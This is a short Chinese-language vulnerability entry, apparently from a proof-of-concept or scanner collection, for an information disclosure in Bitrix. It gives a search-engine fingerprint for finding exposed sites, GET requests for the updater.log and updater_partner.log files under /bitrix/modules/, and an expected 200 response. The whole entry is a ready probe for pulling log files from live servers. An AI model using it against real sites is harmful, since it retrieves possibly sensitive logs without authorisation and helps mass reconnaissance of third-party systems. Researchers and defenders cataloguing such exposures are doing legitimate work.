# Bitrixmodules存在日志信息泄露漏洞

- **系统**：Bitrixmodules　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="/bitrix/modules/"`
- **请求**：`GET /bitrix/modules/updater.log HTTP/1.1`

**请求体 / payload**
```
GET /bitrix/modules/updater_partner.log HTTP/1.1
Host:
```
- **预期**：200　|　—